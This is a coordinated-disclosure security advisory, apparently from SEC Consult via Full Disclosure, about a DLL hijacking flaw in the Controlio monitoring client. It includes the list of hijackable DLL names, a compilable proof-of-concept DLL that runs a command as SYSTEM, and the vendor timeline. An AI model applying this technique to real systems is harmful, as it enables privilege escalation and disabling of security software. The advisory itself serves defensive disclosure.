---
title: SEC Consult SA-20260423-0 :: DLL Hijacking in EfficientLab Controlio (cloud-based employee monitoring service)
url: https://seclists.org/fulldisclosure/2026/Apr/19
source: Full Disclosure
date: 2026-04-29
fetch_date: 2026-04-30T05:30:37.939662
---

# SEC Consult SA-20260423-0 :: DLL Hijacking in EfficientLab Controlio (cloud-based employee monitoring service)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#19)
[![Next](/images/right-icon-16x16.png)](20)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#19)
[![Next](/images/right-icon-16x16.png)](20)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20260423-0 :: DLL Hijacking in EfficientLab Controlio (cloud-based employee monitoring service)

---

*From*: SEC Consult Vulnerability Lab via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Thu, 23 Apr 2026 11:41:34 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20260423-0 >
=======================================================================
             title: DLL Hijacking
           product: EfficientLab Controlio (cloud-based employee monitoring service)
vulnerable version: <1.3.95
     fixed version: 1.3.95
        CVE number: CVE-2025-10549
            impact: High
          homepage:https://controlio.net
             found: 2025-05-20
                by: Tobias Niemann (Office Bochum)
                    Daniel Hirschberger
                    Thorger Jansen (Office Bochum)
                    Marius Renner (Office Berlin)
                    SEC Consult Vulnerability Lab

                    An integrated part of SEC Consult, an Atos business
                    Europe | Asia

                    https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"Controlio is a web-based cloud system for employee surveillance on their work PCs that
run Windows or MAC. You can easily monitor web and application usage, and watch what’s
happening on your staff screens live or on-demand. Check what they type, search on the
Web, what files they copy and much more.
The client app runs in stealth mode on a work computer, so your employees won’t see
additional icons or processes. The system is free to try on three computers."

Source:https://controlio.net/what_is_controlio.html

Business recommendation:
------------------------
The vendor provides a patch v1.3.95 which should be installed immediately.

SEC Consult highly recommends to perform a thorough security review of the
product conducted by security professionals to identify and resolve potential
further security issues.

Vulnerability overview/description:
-----------------------------------
1) DLL Hijacking Vulnerability (CVE-2025-10549)
A local attacker can exploit weak folder permissions in the Controlio
installation directory to perform DLL hijacking attacks. As the service
is running as NT Authority\SYSTEM this allows a local attacker to execute
arbitrary code and commands as highly privileged user and bypass or disable
the monitoring solution.

Proof of concept:
-----------------
1) DLL Hijacking Vulnerability (CVE-2025-10549)
Controlio attempts to load multiple non-existing DLLs from the installation
directory at C:\ProgramData\{UUID}

<procmon.png>

The full list of DLLs that are searched for in the install directory
is listed below:
--------------------------------------------------------------------------------
version.dll
wtsapi32.dll
netapi32.dll
winhttp.dll
shfolder.dll
wsock32.dll
NETUTILS.dll
PowrProf.dll
dbghelp.dll
dbgcore.dll
WER.dll
iphlpapi.dll
Secur32.dll
SSPICLI.dll
WINSTA.dll
olepro32.dll
security.dll
FwpucInt.dll
IdnDL.dll
Wldp.dll
profapi.dll
--------------------------------------------------------------------------------

While a local attacker cannot overwrite the service binaries themselves, the
default permissions allow an attacker to create new files in the installation
directory:

<service_permissions.png>
<install_dir_permissions.png>

An attacker can use this to drop DLLs that execute arbitrary code when they
are loaded when the Controlio service is started. For this proof of concept
the following WER.dll is dropped:

--------------------------------------------------------------------------------
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("whoami > C:\\dll_hijack.txt");
        ExitProcess(0);
    }
    return TRUE;
}

x86_64-w64-mingw32-gcc windows_dll.c -shared -o WER.dll
--------------------------------------------------------------------------------

When the service is restarted, the DLL is loaded and the command is executed as
NT Authority\SYSTEM:

<executed.png>

Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available
at the time of the test:
* Controlio v1.3.0.60

The vendor provides a patched version v1.3.95, it is assumed that all previous
versions are affected.

Vendor contact timeline:
------------------------
2025-07-09: Initial mail to the vendor (info () controlio net); no response
2025-08-22: Sent reminder mail; no response.
2025-09-16: Submitting support ticket viahttps://kb.controlio.net/hc/en-us/requests/new
            Vendor assigns ticket #14957, support agent forwards request to relevant
            department.
            EfficientLab answers that there is a bug bounty page to submit security
            advisories athttps://controlio.net/bug-bounty.html
2025-09-17: Submitting advisory.
2025-10-15: Vendor responds that although out of scope (client agent), they grant
            a 250 USD bug bounty and have accepted it as medium priority.
2025-10-16: Asking the vendor to donate the money to EFF to foster secure software
            development, as well as asking for timeline regarding the fix.
2025-10-16: Vendor will publish an update within the next 4 weeks, donation request
            has been forwarded to relevant team for processing.
2025-10-17: Confirming the postponement of the advisory release.
2025-11-03: Asking for a status update, sending vendor reserved CVE number.
2025-11-04: Vendor responds that the fix is in the roadmap, but there is no clear
            timeline yet, they are hoping to fix it before end of the year.
            Bounty was donated to EFF with transaction ID 9MX93585JU286433M.
2025-11-05: Asking whether they need support or further information regarding the issue
            and what changed regarding the timeline because the vendor provided a
            timeline of 4 weeks mid October.
2025-11-05: Vendor responds that due to internal overload, timeline has shifted.
            No support needed.
2026-02-09: Contacting vendor again, asking for patch status and setting advisory
            release date to 25th February.
2026-02-23: Vendor responds that fix is implemented in the client, but the final build
            is on hold due to driver issues.
2026-02-25: Asking about the new release timeline.
2026-02-26: Fixed version should be released within two weeks.
2026-03-26: Asking for a status update, no response.
2026-04-14: Asking for a status update again. Vendor support contact has requested
            another updated from their developers.
2026-04-21: Vendor informs us that v1.3.95 has been released on 15th April.
2026-04-23: Coordinated release of advisory.

Solution:
---------
The vendor provides a patch v1.3.95 which should be installed immediately.

For further details see their changelog knowledgebase:
https://kb.controlio.net/hc/en-us/articles/45777908471185-Client-Update-April-15-2026-ver-1-3-95

Workaround:
-----------
None

Advisory URL:
-------------
https://sec-consult.com/vulnerability-lab/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~...